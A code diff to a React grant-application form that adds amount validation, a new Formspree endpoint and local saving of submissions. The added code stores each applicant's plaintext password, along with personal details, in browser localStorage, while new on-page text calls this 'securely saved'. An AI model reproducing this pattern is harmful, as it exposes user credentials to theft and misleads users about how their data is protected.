@@ -6,6 +6,7 @@ import {
 } from 'lucide-react';
 import { ViewState } from '../types';
 import FormSubmissionFeedback from './FormSubmissionFeedback';
+import { GRANTS } from '../Constants';
 
 
 interface GrantApplicationProps {
@@ -40,13 +41,12 @@ const GrantApplication: React.FC<GrantApplicationProps> = ({ onNavigate }) => {
   });
   const [errors, setErrors] = useState<Record<string, string>>({});
 
-  const grantCategories = [
-    'Education Grant',
-    'Business / Startup Grant',
-    'Skill / Training Grant',
-    'Emergency / Support Grant',
-    'Research Grant'
-  ];
+  const grantCategories = GRANTS.map(grant => grant.name);
+
+  // Helper function to get grant details
+  const getSelectedGrantDetails = () => {
+    return GRANTS.find(grant => grant.name === grantCategory);
+  };
 
   const eligibilityChecklist = [
     { item: 'Age requirement', checked: true },
@@ -117,6 +117,13 @@ const GrantApplication: React.FC<GrantApplicationProps> = ({ onNavigate }) => {
           <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
             <h2 className="text-2xl md:text-3xl font-black text-slate-900 dark:text-white">Create Your Account</h2>
             <p className="text-slate-600 dark:text-slate-400">Sign up to track your application and receive updates</p>
+
+            <div className="bg-blue-50 dark:bg-blue-900/20 border-2 border-blue-200 dark:border-blue-700 rounded-2xl p-4">
+              <p className="text-blue-700 dark:text-blue-300 font-black text-sm flex items-start gap-2">
+                <span className="mt-0.5">ℹ️</span>
+                <span>Your account details will be securely saved so you can track your grant status after submission. You'll create a passkey to access your tracking dashboard.</span>
+              </p>
+            </div>
 
             {errors.account && (
               <div className="bg-red-50 dark:bg-red-900/20 border-2 border-red-200 dark:border-red-700 rounded-2xl p-4">
@@ -381,11 +388,16 @@ const GrantApplication: React.FC<GrantApplicationProps> = ({ onNavigate }) => {
               </div>
 
               <div>
+                <label className="text-sm font-semibold text-slate-700 dark:text-slate-300 mb-2 block">
+                  Amount Requested (${getSelectedGrantDetails()?.minAmount.toLocaleString() || '0'} - ${getSelectedGrantDetails()?.maxAmount.toLocaleString() || '0'}) *
+                </label>
                 <input
-                  type="text"
-                  placeholder="Amount Requested (e.g., $5,000) *"
+                  type="number"
+                  placeholder={`Amount between $${getSelectedGrantDetails()?.minAmount?.toLocaleString()} - $${getSelectedGrantDetails()?.maxAmount?.toLocaleString()}`}
                   value={applicationData.amount}
                   onChange={(e) => setApplicationData({...applicationData, amount: e.target.value})}
+                  min={getSelectedGrantDetails()?.minAmount}
+                  max={getSelectedGrantDetails()?.maxAmount}
                   className={`w-full px-4 py-3 rounded-xl border-2 bg-white dark:bg-slate-900 text-slate-900 dark:text-white focus:outline-none transition-all ${
                     errors.amount ? 'border-red-500 focus:border-red-500' : 'border-slate-200 dark:border-slate-700 focus:border-indigo-600'
                   }`}
@@ -440,7 +452,21 @@ const GrantApplication: React.FC<GrantApplicationProps> = ({ onNavigate }) => {
                   const newErrors: Record<string, string> = {};
                   if (!applicationData.purpose.trim()) newErrors.purpose = 'Grant purpose is required';
                   if (!applicationData.applicantWork.trim()) newErrors.applicantWork = 'Current work/occupation is required';
-                  if (!applicationData.amount.trim()) newErrors.amount = 'Amount requested is required';
+                  if (!applicationData.amount.trim()) {
+                    newErrors.amount = 'Amount requested is required';
+                  } else {
+                    const amount = parseFloat(applicationData.amount);
+                    const grantDetails = getSelectedGrantDetails();
+                    if (!grantDetails) {
+                      newErrors.amount = 'Invalid grant selected';
+                    } else if (isNaN(amount)) {
+                      newErrors.amount = 'Amount must be a valid number';
+                    } else if (amount < grantDetails.minAmount) {
+                      newErrors.amount = `Minimum amount is $${grantDetails.minAmount.toLocaleString()}`;
+                    } else if (amount > grantDetails.maxAmount) {
+                      newErrors.amount = `Maximum amount is $${grantDetails.maxAmount.toLocaleString()}`;
+                    }
+                  }
                   if (!applicationData.usage.trim()) newErrors.usage = 'Fund usage details are required';
                   if (!applicationData.impact.trim()) newErrors.impact = 'Expected impact is required';
                   
@@ -499,8 +525,13 @@ const GrantApplication: React.FC<GrantApplicationProps> = ({ onNavigate }) => {
                 <CheckCircle2 size={20} className="text-emerald-600 dark:text-emerald-400 flex-shrink-0 mt-0.5" />
                 <div>
                   <h4 className="font-black text-emerald-900 dark:text-emerald-200 mb-1">Ready to Submit</h4>
-                  <p className="text-sm text-emerald-800 dark:text-emerald-300">
-                    Your application will be reviewed by our grant committee. You'll receive updates via email.
+                  <p className="text-sm text-emerald-800 dark:text-emerald-300 mb-2">
+                    Your application will be reviewed by our grant committee.
+                  </p>
+                  <p className="text-sm text-emerald-700 dark:text-emerald-400 font-semibold space-y-1">
+                    <div>🔒 Keep your email and password safe</div>
+                    <div>💡 Use them to login to the Grant Tracking portal</div>
+                    <div>📧 <span className="font-mono bg-emerald-100 dark:bg-emerald-900 px-2 py-1 rounded">{email}</span></div>
                   </p>
                 </div>
               </div>
@@ -525,6 +556,32 @@ const GrantApplication: React.FC<GrantApplicationProps> = ({ onNavigate }) => {
                     if (!email || email.trim() === '') {
                       throw new Error('Applicant email is required');
                     }
+
+                    // Save account to localStorage for grant tracking
+                    const grantApplication = {
+                      fullName,
+                      email,
+                      password,
+                      phone,
+                      country,
+                      grantCategory,
+                      amount: applicationData.amount,
+                      purpose: applicationData.purpose,
+                      applicantWork: applicationData.applicantWork,
+                      usage: applicationData.usage,
+                      impact: applicationData.impact,
+                      previousFunding: applicationData.previousFunding,
+                      timestamp: new Date().toISOString()
+                    };
+
+                    // Get existing applications and add the new one
+                    const existingApplications = JSON.parse(localStorage.getItem('grantApplications') || '[]');
+                    existingApplications.push(grantApplication);
+                    localStorage.setItem('grantApplications', JSON.stringify(existingApplications));
+
+                    console.log('💾 Account saved to local storage for tracking');
+                    console.log('📧 Submission sent to company');
+                    console.log('🔒 Keep your email and password safe for login');
 
                     // Create FormData object with proper Formspree fields
                     const submitFormData = new FormData();
@@ -555,7 +612,7 @@ const GrantApplication: React.FC<GrantApplicationProps> = ({ onNavigate }) => {
                     });
 
                     // Submit to FormSpree
-                    const response = await fetch('https://formspree.io/f/mvzgeadj', {
+                    const response = await fetch('https://formspree.io/f/xjggvoyv', {
                       method: 'POST',
                       body: submitFormData,
                     });
@@ -568,24 +625,21 @@ const GrantApplication: React.FC<GrantApplicationProps> = ({ onNavigate }) => {
                     console.log('✅ Grant application sent successfully!');
                     console.log('📧 Response:', responseData);
                     console.log('📧 Check your email inbox for confirmation');
+                    
+                    // Immediately stop loading - company has received submission
+                    setIsLoading(false);
                   } catch (error) {
                     console.error('❌ Grant submission failed:', error);
+                    setIsLoading(false);
+                    setShowFeedback(false);
                     throw error;
                   }
-                  
-                  setTimeout(() => {
-                    setIsLoading(false);
-                  }, 4000);
-
-                  setTimeout(() => {
-                    onNavigate('HOME');
-                  }, 7000);
                 }}
                 disabled={isLoading}
                 className="flex-1 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-700 hover:to-teal-700 disabled:from-emerald-400 disabled:to-teal-400 text-white py-3 md:py-4 rounded-lg md:rounded-xl font-black transition-all duration-200 flex items-center justify-center gap-2 shadow-lg hover:shadow-emerald-500/50 active:scale-95 disabled:cursor-not-allowed text-sm md:text-base"
               >
                 <CheckCircle2 size={18} className="md:size-6" />
-                <span>{isLoading ? 'Sending to Email...' : 'Submit Application'}</span>
+                <span>{isLoading ? 'Saving Account & Sending Email...' : 'Submit Application'}</span>
               </button>
             </div>
           </motion.div>
